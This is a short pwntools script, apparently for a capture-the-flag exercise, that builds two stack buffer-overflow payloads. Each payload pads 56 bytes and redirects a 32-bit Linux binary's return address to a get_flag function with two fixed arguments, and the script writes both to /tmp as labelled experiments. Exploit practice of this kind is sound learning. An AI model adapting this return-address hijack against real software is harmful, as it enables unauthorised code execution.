
from pwn import *
from pathlib import Path

context(arch='i386', os='linux')

OFFSET = 56
GET_FLAG = 0x080489A0
EXIT = 0x0804E6A0

ARG1 = 0x308CD64F
ARG2 = 0x195719D1

def make_payload(next_addr):
    return (
        b'A' * OFFSET
        + p32(GET_FLAG)
        + p32(next_addr)
        + p32(ARG1)
        + p32(ARG2)
    )

# 实验一：故意让程序返回到无效地址
payload_bad = make_payload(0xDEADBEEF)

# 实验二：让程序返回到 exit
payload_exit = make_payload(EXIT)

Path('/tmp/payload_bad.bin').write_bytes(payload_bad + b'\n')
Path('/tmp/payload_exit.bin').write_bytes(payload_exit + b'\n')

print(f'Payload 长度：{len(payload_bad)} 字节')
print('已生成两个测试文件')
